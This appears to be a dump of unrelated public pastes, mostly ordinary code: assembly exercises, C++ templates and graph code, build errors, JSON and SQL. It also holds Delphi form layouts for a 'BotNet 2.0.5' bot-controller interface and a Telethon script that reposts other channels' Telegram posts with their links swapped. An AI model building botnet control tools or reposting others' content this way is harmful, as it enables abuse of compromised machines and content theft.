       Caption = 'Use fake hosts'
       TabOrder = 9
     end
     object Edit5: TEdit
       Left = 256
       Top = 232
       Width = 113
       Height = 22
       Color = 15921906
       TabOrder = 10
       Text = 'BotNet 2.0.5 Service'
       OnKeyDown = Edit3KeyDown
     end
     object Edit6: TEdit
       Left = 376
       Top = 232
       Width = 113
       Height = 22
       Color = 15921906
       TabOrder = 11
       Text = '#Admin'
       OnKeyDown = Edit3KeyDown
     end
     object MainMenu1: TMainMenu
       Left = 384
       Top = 144
       object File1: TMenuItem
         Caption = '&File'
         object LoadSettings1: TMenuItem
           Caption = '&Load Settings...'
           OnClick = LoadSettings1Click
         end
       end
     end
     object OpenDialog1: TOpenDialog
       Filter = 'BotNet 2.0.5|*.bn5'
       Left = 384
       Top = 112
     end
     object SaveDialog1: TSaveDialog
       Filter = 'BotNet 2.0.5|*.bn5'
       Left = 384
       Top = 80
     end
   end"
aYFbmUt0,Untitled,wclovers,CSS,Wednesday 7th of June 2023 05:26:25 AM CDT,"@media only screen and (max-width: 768px) {
    #wcfm-main-contentainer .wcfm-page-headig-fixed, #wcfm-main-contentainer .wcfm-menu-fixed {
        top: 50px !important;
    }
}"
xxJJp1aD,Untitled,Farhana_Zaman,6502 Kick Assembler,Wednesday 7th of June 2023 05:26:20 AM CDT,".model small 
.data 
m1 db 0ah,0dh,'type a character :','$' 
m2 db 0ah,0dh,'the ascii code of ' 
c1 db ?,' in hexa is ','$' 
.code 
main proc 
mov ax,@data 
;intialize ds 
mov ds,ax 
;------------ 
begin: mov ah,9 
;prompt user 
lea dx,m1 
int 21h 
mov ah,1 
;read char. 
int 21h 
cmp al,0dh 
;if cr exit
 
je out_ 
mov c1,al 
;store char 
. 
mov bl,al 
;take a copy of char 
mov ah,9 
;display 2
 
lea dx,m2 


int 21h 
 
mov cl,4 
shr c1,cl 
;prapare for display 1

 
;* note below 
add c1,30h 
;convert to char.
 
mov dl,c1 
jmp exe1 
continue: and bl,0fh 
;convert 2

 
cmp bl,9 
;if >9 mean a,b,c…..hex ch. 
jg error_ 
add bl,30h 
;convert to char 
. 
mov dl,bl 
jmp exe2 
exe1: mov ah,2 
;1

 
int 21h 
jmp continue 
exe2: mov ah,2 
int 21h 

 
jmp begin 
;ask if you want to do it again
 
;------------ 
error_: add bl,37h 
;convert to a,b,c…. hexa ch
. 
mov dl,bl 
mov ah,2 
;display it

int 21h 

jmp begin 
;ask if you want to do it again
 
out_: mov ah,4ch 
;return to dos 
int 21h 
main endp 
end main "
FuTp8M0u,Untitled,Farhana_Zaman,C,Wednesday 7th of June 2023 05:24:17 AM CDT,".model small 
.data 
m1 db 'type a character :','$' 
m2 db 0ah,0dh,'the ascii code of ' 
c1 db ?,' in binary is :','$' 
m3 db 0ah,0dh,'the number of 1 bit is ' 
c2 db ?,'$' 
.code 
main proc 
mov ax,@data 
;initialize ds
 
mov ds,ax 
mov ah,9 
;prompt the user 
lea dx,m1 
int 21h 
;------------- 
mov ah,1 
;read character 
int 21h 
mov bl,al 
mov c1,al 
;store character 
 
mov ah,9 

lea dx,m2 
int 21h 

mov bh,0 
;counter for one’s 
mov cx,8 
mov ah,2 
l1: shl bl,1 
;display content of bl
 
jc l2 
mov dl,'0' 
int 21h 
jmp l4 
l2: mov dl,'1' 
int 21h 
inc bh 
;count number of one’s 
l4: loop l1 
add bh,30h 
;convert to char. 
mov c2,bh 
mov ah,9 
;display number of one’s
 
lea dx,m3 
int 21h 

mov ah,4ch 
;return to dos 
int 21h 
main endp 
end main   
"
w13kU0tV,Untitled,skimono,C++,Wednesday 7th of June 2023 05:14:02 AM CDT,"﻿#pragma GCC optimize(""Ofast"") // ������������ ���������, �� ��� ������
#pragma GCC optimize(""no-stack-protector"") //�����
#pragma GCC optimize(""unroll-loops"") // � ���� ���� ��� �� 100 �� ������ ����� � ��������� �� ��� � 100 ��� �� ������ ��������
#pragma GCC target(""sse,sse2,sse3,ssse3,popcnt,abm,mmx,tune=native"") // ��� ����� ����� �� ��� 03 02 ��������� � ������ ������� �������� ��� ���� ������������
#pragma GCC optimize(""fast-math"")
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
#include <cmath>
#include <stack>
#include <iomanip>
#include <fstream>
#include <string>
#include <set>
#include <deque>
#include <queue>
#include <map>
#include <bitset>
#include <random>
#include <list>
#include <unordered_map>
#include <unordered_set>
#include <cassert>

using namespace std;

typedef long long ll;
typedef short sh;
typedef unsigned long long ull;
typedef long double ld;
typedef string str;
//typedef __int128 ultraint;
#define sqrt sqrtl
#define F first
#define S second
#define endl '\n'
#define all(vc666) vc666.begin(), vc666.end()
#define allr(vc666) vc666.rbegin(), vc666.rend()
#define int long long
#define degug(x) cerr (#x) << "" "" << (x) << endl;

const ll INF = 3e12;
const ll inf = 1e12 + 7;
const ll ONE = 1;
const ll mod = 1e9 + 7;
const ll m1 = 1e9 + 575179;
const ll m2 = 1e9 + 87;
const ll LG = 19;
const ll k = 347;
ld EPS = 1e-7;
ld PI = 3.1415926535897932384;
ld phi = (sqrt(5) + 1.0) / 2.0;
mt19937_64 gen(rand());

const int N = 1e4, M = 1e6;
vector <int> g[N], g2[N], g3[N];
pair <int, int> edge[M];
bitset <N> used;
vector <int> path;
int colors[N];
pair <int, int> zxc[N];//In Out
int p[N], sz[N];
int dasha = 0;

int get(int v) {
    if (p[v] == v) return v;
    p[v] = get(p[v]);
    return p[v];
}

void unite(int u, int v) {
    u = get(u);
    v = get(v);
    if (sz[v] > sz[u]) swap(u, v);
    if (u == v) return;
    p[v] = u;
    zxc[u].first += zxc[v].first;
    zxc[u].second += zxc[v].second;
    sz[u] += sz[v];
}

void top_sort(int v) {
    used[v] = true;
    for (auto u : g[v]) {
        if (!used[u]) top_sort(u);
    }
    path.push_back(v);
}

void kss(int v, int color) {
    used[v] = true;
    colors[v] = color;
    for (auto u : g2[v]) {
        if (!used[u]) kss(u, color);
    }
}

int dfs(int v, int kor) {
    path.push_back(v);
    used[v] = true;
    colors[v] = kor;
    int sum = 0;
    if (g3[v].empty() && v == kor) dasha++;
    if (g3[v].empty()) return 1;
    for (auto u : g3[v]) {
        if (!used[u]) {
            sum += dfs(u, kor);
        }
        else {
            path.push_back(colors[u]);
        }
    }
    return sum;
}

bool cmp(const pair <int, int>& a, const pair <int, int>& b) {
    if (a.first < b.first) {
        return true;
    }
    else if (a.first == b.first) {
        return a.second > b.second;
    }
    else {
        return false;
    }
}

void solve() {
    int n, m, i, j, u, v, cnt = 0, ans = 0;
    cin >> n >> m;
    for (i = 0; i < m; i++) {
        cin >> u >> v;
        u--, v--;
        g[u].push_back(v);
        g2[v].push_back(u);
        edge[i] = { u, v };
    }
    for (i = 0; i < n; i++) {
        if (!used[i]) top_sort(i);
    }
    used.reset();
    reverse(all(path));
    for (i = 0; i < n; i++) {
        if (!used[path[i]]) {
            kss(path[i], cnt);
            cnt++;
        }
    }
    used.reset();
    for (i = 0; i < m; i++) {
        if (colors[edge[i].first] != colors[edge[i].second]) {
            g3[colors[edge[i].first]].push_back(colors[edge[i].second]);
        }
    }
    for (i = 0; i < cnt; i++) {
        p[i] = i;
        sz[i] = 1;
        zxc[i] = { 0, 0 };
    }
    for (i = 0; i < cnt; i++) {
        if (!used[i]) {
            path.clear();
            zxc[i].first = 1;
            zxc[i].second = dfs(i, i);
            for (auto it : path) {
                unite(i, it);
            }
        }
    }
    vector <pair <int, int> > slava;
    for (i = 0; i < cnt; i++) {
        v = get(i);
        if (i == v) {
            slava.push_back(zxc[i]);
        }
    }
    if (dasha == 1 && cnt == 1) {
        cout << 0 << endl;
        return;
    }
    sort(all(slava), cmp);
    int in = slava.front().first, out = slava.front().second;
    for (i = 1; i < slava.size(); i++) {
        ans += slava[i].first;
        if (slava[i].first > out) {
            out = slava[i].second;
        }
        else {
            out -= slava[i].first;
            out += slava[i].second;
        }
    }
    ans += in * out;
    cout << ans << endl;
}

signed main() {
#ifdef _DEBUG
    freopen(""input.txt"", ""r "", stdin);
    freopen(""output.txt"", ""w"", stdout);
#endif
    ios_base::sync_with_stdio(0);
    cin.tie(NULL);
    cout.tie(NULL);
    int t = 1;
    //cin >> t;
    while (t--) solve();
}
//Deisgned by skimono"
sadwZ3YS,Untitled,Nicksed,Java,Wednesday 7th of June 2023 05:13:13 AM CDT,"// what will return getUserCount() if called after processTransaction()

@Service
public class TransactionalPuzzlerService {

    @Autowired
    private UserRepository userRepository;

    @Transactional
    public void performTransactionalOperation() {
        userRepository.deleteAll();
        throw new RuntimeException(""Oops! Something went wrong."");
    }

    public void processTransaction() {
        performTransactionalOperation();
    }

    public int getUserCount() {
        return userRepository.count();
    }
}"
6G8mu90s,Untitled,vpeter,Bash,Wednesday 7th of June 2023 05:06:24 AM CDT,"  CC      common_drivers/drivers/spi/spi-meson-spifc-v2.o
  CC      kernel/trace/trace_events.o
common_drivers/drivers/spi/spi-meson-spifc-v2.c:740:54: error: 'enum spi_nor_ops' declared inside parameter list will not be visible outside of this definition or declaration [-Werror]
  740 | static int meson_snor_prep(struct spi_nor *nor, enum spi_nor_ops ops)
      |                                                      ^~~~~~~~~~~
common_drivers/drivers/spi/spi-meson-spifc-v2.c:740:66: error: parameter 2 ('ops') has incomplete type
  740 | static int meson_snor_prep(struct spi_nor *nor, enum spi_nor_ops ops)
      |                                                 ~~~~~~~~~~~~~~~~~^~~
common_drivers/drivers/spi/spi-meson-spifc-v2.c:749:57: error: 'enum spi_nor_ops' declared inside parameter list will not be visible outside of this definition or declaration [-Werror]
  749 | static void meson_snor_unprep(struct spi_nor *nor, enum spi_nor_ops ops)
      |                                                         ^~~~~~~~~~~
common_drivers/drivers/spi/spi-meson-spifc-v2.c:749:69: error: parameter 2 ('ops') has incomplete type
  749 | static void meson_snor_unprep(struct spi_nor *nor, enum spi_nor_ops ops)
      |                                                    ~~~~~~~~~~~~~~~~~^~~
common_drivers/drivers/spi/spi-meson-spifc-v2.c: In function 'meson_snor_init':
common_drivers/drivers/spi/spi-meson-spifc-v2.c:880:12: error: 'struct spi_nor' has no member named 'prepare'
  880 |         nor->prepare = meson_snor_prep;
      |            ^~
common_drivers/drivers/spi/spi-meson-spifc-v2.c:881:12: error: 'struct spi_nor' has no member named 'unprepare'
  881 |         nor->unprepare = meson_snor_unprep;
      |            ^~
common_drivers/drivers/spi/spi-meson-spifc-v2.c:882:14: error: 'struct spi_nor' has no member named 'read_reg'; did you mean 'read_proto'?
  882 |         nor->read_reg = meson_snor_read_reg;
      |              ^~~~~~~~
      |              read_proto
common_drivers/drivers/spi/spi-meson-spifc-v2.c:883:14: error: 'struct spi_nor' has no member named 'write_reg'; did you mean 'write_proto'?
  883 |         nor->write_reg = meson_snor_write_reg;
      |              ^~~~~~~~~
      |              write_proto
common_drivers/drivers/spi/spi-meson-spifc-v2.c:884:12: error: 'struct spi_nor' has no member named 'read'
  884 |         nor->read = meson_snor_read;
      |            ^~
common_drivers/drivers/spi/spi-meson-spifc-v2.c:885:12: error: 'struct spi_nor' has no member named 'write'
  885 |         nor->write = meson_snor_write;
      |            ^~
common_drivers/drivers/spi/spi-meson-spifc-v2.c:886:12: error: 'struct spi_nor' has no member named 'erase'
  886 |         nor->erase = NULL;
      |            ^~
At top level:
cc1: note: unrecognized command-line option '-Wno-tautological-pointer-compare' may have been intended to silence earlier diagnostics
cc1: all warnings being treated as errors
make[2]: *** [scripts/Makefile.build:287: common_drivers/drivers/spi/spi-meson-spifc-v2.o] Error 1
make[1]: *** [scripts/Makefile.build:549: common_drivers/drivers/spi] Error 2
make: *** [Makefile:1985: common_drivers/drivers] Error 2
make: *** Waiting for unfinished jobs....
  CC      fs/ext4/inode.o
  CC [M]  drivers/usb/serial/io_ti.o
  CC      kernel/trace/trace_export.o
  CC      kernel/trace/trace_syscalls.o
  CC [M]  drivers/usb/serial/empeg.o
  CC [M]  drivers/usb/serial/f81232.o
  CC      kernel/trace/trace_event_perf.o
  CC      kernel/trace/trace_events_filter.o
  CC [M]  drivers/usb/serial/f81534.o
  CC      fs/ext4/ioctl.o
  CC [M]  drivers/usb/serial/ftdi_sio.o
  CC      kernel/trace/trace_events_trigger.o
  CC      kernel/trace/trace_eprobe.o"
aKSWcS98,json,maskon,JSON,Wednesday 7th of June 2023 05:01:43 AM CDT,"{
    ""summ"": 9586.92,
    ""date"": ""2023-04-30T19:56:12.311472"",
    ""clientTransactionID"": ""231f1d51-d32d-46a5-b337-faaec7f6e057"",
    ""status"": ""SALE"",
    ""payments"": [
        {
            ""paymentDate"": ""2023-04-30T19:56:12.311472"",
            ""paymentID"": ""ca19bfac-b89b-46b5-ba4c-6b5ff087d9c5"",
            ""paymentAmount"": 4793.46,
            ""paymentType"": ""CARD""
        },
        {
            ""paymentDate"": ""2023-04-30T19:56:12.311472"",
            ""paymentID"": ""e283b7a1-9c1e-4d7b-a2cf-470f5dcaddd9"",
            ""paymentAmount"": 4793.46,
            ""paymentType"": ""CASH""
        }
    ],
    ""store"": {
        ""storeID"": ""011f94fc-663e-4bf4-9699-201f478b6ab3"",
        ""storeAddress"": ""My address in my City."",
        ""storeName"": ""store_123"",
    },
    ""user"": {
        ""userID"": ""c768b81d-7462-4907-8167-f2e8b627b9c9"",
        ""userName"": ""user_23""
    },
    ""productList"": [
        {
            ""quantity"": 4,
            ""listSumm"": 9586.92,
            ""productID"": ""009d9adf-ba8a-46c5-bd1c-cea62ba867c6"",
            ""productName"": ""Coca-Cola"",
            ""units"": ""шт"",
        },
		{
            ""quantity"": 7,
            ""listSumm"": 8297.04,
            ""productID"": ""16e7759d-947d-49cc-a1df-2179920488ab"",
            ""productName"": ""Apple"",
            ""units"": ""кг"",
        }
    ]
}"
QGiwQgCt,Untitled,35657,C++,Wednesday 7th of June 2023 04:48:41 AM CDT,"#include <iostream>

using namespace std;


template <typename T>
void sort(T array[], size_t size) {
    for (int k = 0; k < size; k++) {
        for (int j = 0; j < size - 1; j++) {
            if (array[j] > array[j + 1]) {
                T temp = array[j];
                array[j] = array[j + 1];
                array[j + 1] = temp;
            }
        }
    }
}



template<typename T>
void display(T array[], size_t size) {
    for (int i = 0; i < size; i++) {
        cout << array[i] << "" "";
    }
    cout << endl;
}


int main()
{
    cout << ""Sort Template"" << endl << endl;

    int intArray[]{ 1, 3, 7, -4, -2, 4 };
    int size = sizeof(intArray) / sizeof(int);
    cout << ""Original int Array : "";
    display(intArray, size);
    sort(intArray, size);
    cout << ""Sorted   int Array : "";
    display(intArray, size);

    char chrArray[]{ 'o', 't', 't', 'f', 'f', 's', 's', 'e', 'n' };
    size = sizeof(chrArray) / sizeof(char);
    cout << ""Original chr Array : "";
    display(chrArray, size);
    sort(chrArray, size);
    cout << ""Sorted   chr Array : "";
    display(chrArray, size);

    string strArray[]{ ""one"", ""two"", ""three"", ""four"", ""five"" };
    size = sizeof(strArray) / sizeof(string);
    cout << ""Original str Array : "";
    display(strArray, size);
    sort(strArray, size);
    cout << ""Sorted   str Array : "";
    display(strArray, size);
}
"
hDCsrxEr,Untitled,35657,C++,Wednesday 7th of June 2023 04:42:08 AM CDT,"// Задание: 
// 1) реализовать шаблонный вариант SimpleVector
// 2) реализовать две отдельные шаблонные функции:
// void print(...) ... для вывода элементов любого варианта SimpleVector
// void sort(...) ... для сортировки любого варианта SimpleVector
// 3) проверить работоспособность кода, раскомментировав строки в main


#include <iostream>

using namespace std;

class SimpleVector {

public:

	SimpleVector() : arr_(new int[10]), size_(10) {}

	SimpleVector(int size) : arr_(new int[size]), size_(size) {}

	SimpleVector(const SimpleVector& object) : arr_(new int[object.size_]{}), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new int[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}
		return *this;
	}

	SimpleVector(SimpleVector&& object) : arr_(object.arr_), size_(object.size_) {
		object.arr_ = nullptr;
		object.size_ = 0;
	}

	SimpleVector& operator=(SimpleVector&& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = object.arr_;
			size_ = object.size_;
			object.arr_ = nullptr;
			object.size_ = 0;
		}
		return *this;
	}

	int& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	int& operator[] (int index) const {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	int Size() const {
		return size_;
	}

	~SimpleVector() {
		delete[] arr_;
	}

private:
	int* arr_;
	int size_;
};



int main() {
	SimpleVector vec;
	for (int i = 0; i < vec.Size(); i++) {
		vec[i] =  rand() % 10;
	}
	for (int i = 0; i < vec.Size(); i++) {
		cout << vec[i] << "" "";
	}
	cout << endl;

	/*SimpleVector<int> IntVector;
	for (int i = 0; i < IntVector.Size(); i++) {
		IntVector[i] = rand() % 10;
	}
	cout << ""IntVector:"" << endl;
	print(IntVector);
	cout << endl;
	cout << ""Sorted IntVector:"" << endl;
	sort(IntVector);
	print(IntVector);
	cout << endl;

	SimpleVector<string> StringVector;
	StringVector[0] = ""two"";
	StringVector[1] = ""seven"";
	StringVector[2] = ""zero"";
	StringVector[3] = ""four"";
	StringVector[4] = ""one"";
	StringVector[5] = ""three"";
	StringVector[6] = ""five"";
	StringVector[7] = ""six"";
	StringVector[8] = ""eight"";
	StringVector[9] = ""nine"";
	cout << ""StringVector:"" << endl;
	print(StringVector);
	cout << endl;
	cout << ""Sorted StringVector:"" << endl;
	sort(StringVector);
	print(StringVector);
	cout << endl;*/
}"
k9EgcjMs,Untitled,35657,C++,Wednesday 7th of June 2023 04:41:09 AM CDT,"#include <iostream>
#include <vector>

using namespace std;


template<typename T>
class Array {

public:

    int getSize() const {
        return size;
    }

    T getItem(size_t index) const {
        if (index >= 0 && index < size) {
            return arr[index];
        }
    }

    void setItem(size_t index, T value) {
        if (index >= 0 && index < size) {
            arr[index] = value;
        }
    }

    void display() {
        for (int i = 0; i < size; i++) {
            cout << arr[i] << "" "";
        }
        cout << endl;
    }

    void sort() {
        for (int k = 0; k < size; k++) {
            for (int j = 0; j < size - 1; j++) {
                if (arr[j] > arr[j + 1]) {
                    T temp = arr[j];
                    arr[j] = arr[j + 1];
                    arr[j + 1] = temp;
                }
            }
        }
    }

private:
    static const size_t size = 5;
    T arr[size]{};
};

int main() {

    cout << ""Class Tempate Array"" << endl << endl;

    Array<int> intArray;
    cout << ""int Array initialization:"" << endl;
    intArray.display();
    int size = intArray.getSize();
    for (int i = 0; i < size; i++) {
        intArray.setItem(i, rand() % 10);
    }
    cout << endl << ""int Array after assignment:"" << endl;
    intArray.display();
    intArray.sort();
    cout << endl << ""int Array after ordering:"" << endl;
    intArray.display();
    cout << endl;

    Array<string> strArray;
    cout << ""str Array initialization:"" << endl;
    strArray.display();
    strArray.setItem(0, ""two"");
    strArray.setItem(1, ""seven"");
    strArray.setItem(2, ""zero"");
    strArray.setItem(3, ""four"");
    strArray.setItem(4, ""one"");
    cout << endl << ""str Array after assignment:"" << endl;
    strArray.display();
    strArray.sort();
    cout << endl << ""str Array after ordering:"" << endl;
    strArray.display();
}
"
8h6NL07A,Unit1.dfm,FlyFar,Delphi,Wednesday 7th of June 2023 04:26:08 AM CDT,"   object Form1: TForm1
     Left = 190
     Top = 110
     Width = 386
     Height = 335
     Caption = 'BotNet 2.0.5 - UCC Release'
     Color = clBtnFace
     Font.Charset = DEFAULT_CHARSET
     Font.Color = clWindowText
     Font.Height = -11
     Font.Name = 'Arial'
     Font.Style = []
     Menu = MainMenu1
     OldCreateOrder = False
     OnCreate = FormCreate
     OnResize = FormResize
     DesignSize = (
       378
       289)
     PixelsPerInch = 96
     TextHeight = 14
     object Label1: TLabel
       Left = 129
       Top = 8
       Width = 9
       Height = 25
       Alignment = taCenter
       Anchors = [akTop, akRight]
       AutoSize = False
       Caption = ':'
       Font.Charset = DEFAULT_CHARSET
       Font.Color = clWindowText
       Font.Height = -11
       Font.Name = 'Arial'
       Font.Style = [fsBold]
       ParentFont = False
       Layout = tlCenter
     end
     object Label3: TLabel
       Left = 0
       Top = 32
       Width = 73
       Height = 17
       AutoSize = False
       Caption = 'Socket Status:'
       Font.Charset = DEFAULT_CHARSET
       Font.Color = 3618615
       Font.Height = -11
       Font.Name = 'Arial'
       Font.Style = []
       ParentFont = False
     end
     object Label4: TLabel
       Left = 80
       Top = 32
       Width = 298
       Height = 17
       Anchors = [akLeft, akTop, akRight]
       AutoSize = False
       Caption = 'None'
       Font.Charset = DEFAULT_CHARSET
       Font.Color = clMaroon
       Font.Height = -11
       Font.Name = 'Arial'
       Font.Style = []
       ParentFont = False
     end
     object Label2: TLabel
       Left = 193
       Top = 8
       Width = 9
       Height = 25
       Alignment = taCenter
       Anchors = [akTop, akRight]
       AutoSize = False
       Caption = ':'
       Font.Charset = DEFAULT_CHARSET
       Font.Color = clWindowText
       Font.Height = -11
       Font.Name = 'Arial'
       Font.Style = [fsBold]
       ParentFont = False
       Layout = tlCenter
     end
     object Panel1: TPanel
       Left = 0
       Top = 48
       Width = 378
       Height = 169
       Anchors = [akLeft, akTop, akRight, akBottom]
       BevelOuter = bvNone
       TabOrder = 0
       object Splitter1: TSplitter
         Left = 249
         Top = 0
         Width = 5
         Height = 169
         Cursor = crHSplit
         AutoSnap = False
         Beveled = True
         MinSize = 40
         ResizeStyle = rsUpdate
       end
       object ListView1: TListView
         Left = 254
         Top = 0
         Width = 124
         Height = 169
         Align = alClient
         Color = 15921906
         Columns = <
           item
             Caption = 'Nickname'
             Width = 80
           end
           item
             Caption = 'Data'
             Width = 0
           end>
         ColumnClick = False
         MultiSelect = True
         ReadOnly = True
         RowSelect = True
         ShowColumnHeaders = False
         TabOrder = 0
         ViewStyle = vsReport
         OnClick = ListView1Click
         OnResize = ListView1Resize
       end
       object PageControl1: TPageControl
         Left = 0
         Top = 0
         Width = 249
         Height = 169
         ActivePage = TabSheet2
         Align = alLeft
         Font.Charset = DEFAULT_CHARSET
         Font.Color = clWindowText
         Font.Height = -11
         Font.Name = 'Arial'
         Font.Style = []
         MultiLine = True
         ParentFont = False
         TabIndex = 1
         TabOrder = 1
         TabPosition = tpLeft
         object TabSheet1: TTabSheet
           Caption = 'Information'
           object Memo3: TMemo
             Left = 0
             Top = 0
             Width = 222
             Height = 161
             Align = alClient
             Color = 15921906
             Ctl3D = True
             ParentCtl3D = False
             ReadOnly = True
             ScrollBars = ssVertical
             TabOrder = 0
           end
         end
         object TabSheet2: TTabSheet
           Caption = 'Chat'
           ImageIndex = 1
           object Memo1: TMemo
             Left = 0
             Top = 0
             Width = 222
             Height = 161
             Align = alClient
             Color = 15921906
             ReadOnly = True
             ScrollBars = ssVertical
             TabOrder = 0
           end
         end
       end
     end
     object RadioButton1: TRadioButton
       Left = 0
       Top = 224
       Width = 33
       Height = 17
       Anchors = [akLeft, akBottom]
       Caption = 'All'
       Checked = True
       TabOrder = 1
       TabStop = True
     end
     object RadioButton2: TRadioButton
       Left = 40
       Top = 224
       Width = 17
       Height = 17
       Anchors = [akLeft, akBottom]
       Caption = 'RadioButton2'
       TabOrder = 2
     end
     object ComboBox1: TComboBox
       Left = 56
       Top = 220
       Width = 195
       Height = 22
       Style = csDropDownList
       Anchors = [akLeft, akRight, akBottom]
       Color = 15921906
       ItemHeight = 14
       ItemIndex = 0
       TabOrder = 3
       Text = 'Selected Bots Only'
       Items.Strings = (
         'Selected Bots Only'
         'Bots Starting With'
         'Bots Containing'
         'Bots Ending With')
     end
     object Edit4: TEdit
       Left = 254
       Top = 220
       Width = 124
       Height = 22
       Anchors = [akRight, akBottom]
       Color = 15921906
       TabOrder = 4
     end
     object Button3: TButton
       Left = 329
       Top = 245
       Width = 49
       Height = 20
       Anchors = [akRight, akBottom]
       Caption = '&Send'
       TabOrder = 5
       OnClick = Button3Click
     end
     object StatusBar1: TStatusBar
       Left = 0
       Top = 271
       Width = 378
       Height = 18
       Panels = <
         item
           Text = '0 Bots'
           Width = 80
         end
         item
           Text = 'Client: Offline'
           Width = 80
         end
         item
           Text = 'Server: Offline'
           Width = 80
         end
         item
           Text = 'Timer: 00:00:00'
           Width = 50
         end>
       SimplePanel = False
     end
     object Edit1: TEdit
       Left = 0
       Top = 8
       Width = 129
       Height = 22
       Anchors = [akLeft, akTop, akRight]
       Color = 15921906
       TabOrder = 7
       Text = '127.0.0.1'
     end
     object Edit2: TEdit
       Left = 137
       Top = 8
       Width = 57
       Height = 22
       Anchors = [akTop, akRight]
       Color = 15921906
       TabOrder = 8
       Text = '6668'
     end
     object Button2: TButton
       Left = 313
       Top = 8
       Width = 65
       Height = 22
       Anchors = [akTop, akRight]
       Caption = '&Connect'
       TabOrder = 10
       OnClick = Button2Click
     end
     object Panel2: TPanel
       Left = 0
       Top = 0
       Width = 378
       Height = 2
       Align = alTop
       BevelOuter = bvLowered
       TabOrder = 11
     end
     object CheckBox1: TCheckBox
       Left = 257
       Top = 248
       Width = 65
       Height = 17
       Anchors = [akRight, akBottom]
       Caption = 'Rawdata'
       TabOrder = 12
     end
     object bGate: TCheckBox
       Left = 264
       Top = 8
       Width = 49
       Height = 22
       Anchors = [akTop, akRight]
       Caption = 'Gate'
       TabOrder = 13
     end
     object Edit3: TEdit
       Left = 201
       Top = 8
       Width = 57
       Height = 22
       Anchors = [akTop, akRight]
       Color = 15921906
       TabOrder = 9
       Text = 'AdminNick'
     end
     object Memo2: TEdit
       Left = 0
       Top = 245
       Width = 251
       Height = 22
       Anchors = [akLeft, akRight, akBottom]
       TabOrder = 14
     end
     object MainMenu1: TMainMenu
       Left = 64
       Top = 56
       object FIle1: TMenuItem
         Caption = '&File'
         object Config1: TMenuItem
           Caption = '&Config'
           OnClick = Config1Click
         end
         object N1: TMenuItem
           Caption = '-'
         end
         object Client1: TMenuItem
           Caption = 'C&lient'
           object Start1: TMenuItem
             Caption = '&Start'
             OnClick = Start1Click
           end
           object Stop1: TMenuItem
             Caption = 'S&top'
             OnClick = Stop1Click
           end
         end
         object Server1: TMenuItem
           Caption = '&Server'
           object Start2: TMenuItem
             Caption = '&Start'
             OnClick = Start2Click
           end
           object Stop2: TMenuItem
             Caption = 'S&top'
             OnClick = Stop2Click
           end
         end
         object N2: TMenuItem
           Caption = '-'
         end
         object Exit1: TMenuItem
           Caption = '&Exit'
           OnClick = Exit1Click
         end
       end
       object About1: TMenuItem
         Caption = '&About'
         object BotNet1: TMenuItem
           Caption = '&BotNet'
         end
         object BotPage1: TMenuItem
           Caption = 'B&otPage'
         end
       end
     end
     object Timer1: TTimer
       Enabled = False
       Interval = 10
       OnTimer = Timer1Timer
       Left = 32
       Top = 56
     end
     object ServerSocket1: TServerSocket
       Active = False
       Port = 6667
       ServerType = stNonBlocking
       OnListen = ServerSocket1Listen
       OnClientConnect = ServerSocket1ClientConnect
       OnClientRead = ServerSocket1ClientRead
       OnClientError = ServerSocket1ClientError
       Left = 96
       Top = 56
     end
     object ClientSocket1: TClientSocket
       Active = False
       ClientType = ctNonBlocking
       Port = 0
       OnConnecting = ClientSocket1Connecting
       OnConnect = ClientSocket1Connect
       OnDisconnect = ClientSocket1Disconnect
       OnRead = ClientSocket1Read
       OnError = ClientSocket1Error
       Left = 128
       Top = 56
     end
     object Timer2: TTimer
       Interval = 1
       OnTimer = Timer2Timer
       Left = 160
       Top = 56
     end
   end"
hPZJJKFc,6415,MrFireos,Python,Wednesday 7th of June 2023 04:20:07 AM CDT,"def prime(n):
    d=2
    while d**2 <= n:
        if n%d==0:
            return False
        d+=1
    return True
    
for i in range(41, 100):
    s='0' + '1'*122 + '2'*i + '0'
    while '00' not in s:
        s=s.replace('02', '101', 1)
        s=s.replace('11', '2', 1)
        s=s.replace('012', '30', 1)
        s=s.replace('010', '00', 1)
        
    sm=0
    for j in s:
        sm+=int(j)
    if prime(sm):
        print(i)
        break"
btuYrSyH,Як #telegram канали крадуть контент один в одного,askanton,Python,Wednesday 7th of June 2023 04:17:08 AM CDT,"from telethon import TelegramClient, events
from telethon.tl.types import MessageEntityTextUrl

api_id = 0000000  #
api_hash = ""*******""

client = TelegramClient(""Video"", api_id, api_hash)
target_can = -10000000000  # id каналу в який будуть пересилатись новини
client.parse_mode = ""html""


@client.on(events.NewMessage(chats=[-10000000000]))
async def normal_handler(event):
    print(""**************************************************"")
    if event.message.peer_id != target_can:
        if not event.message.is_private and not event.message.is_reply:
            print(event.message.peer_id)
            mess = event.message
            for i in range(len(mess.entities) - 1):
                try:
                    print(len(mess.entities))
                    print(mess.get_entities_text(MessageEntityTextUrl)[i])
                    if isinstance(mess.entities[i], MessageEntityTextUrl):
                        entity = mess.entities[i]
                        print(entity)
                        new_text = ""!!!Новий текст!!!""  # текст під яким буде заховано посилання
                        entity.length = len(new_text)
                        entity.url = (
                            ""https://t.me/+JJJJJJJJJJJJ""  # писилання з підпису
                        )
                        mess.message = mess.message.replace(
                            mess.get_entities_text(MessageEntityTextUrl)[i][1],
                            ""!!!Новий текст!!!!"",  # текст під яким буде заховано посилання
                        )
                        print(entity)
                except Exception as e:
                    print(e)

            await client.send_message(target_can, mess, parse_mode=""html"")


client.start(password=""00000000000"")
client.run_until_disconnected()
"
LDpiibHc,Untitled,BayangBec,PostgreSQL,Wednesday 7th of June 2023 04:16:21 AM CDT,"INSERT INTO public.generic_lookup (id,lookup_name,lookup_text,lookup_order,deleted_at,created_at,updated_at) VALUES
	 ('40f89da0-53c6-11ea-b6cc-87ba0e195354'::uuid,'BOOK-EDITION','Revisi Sampul Baru',2,NULL,'2020-04-28 13:55:06.004','2020-04-28 13:55:06.004'),
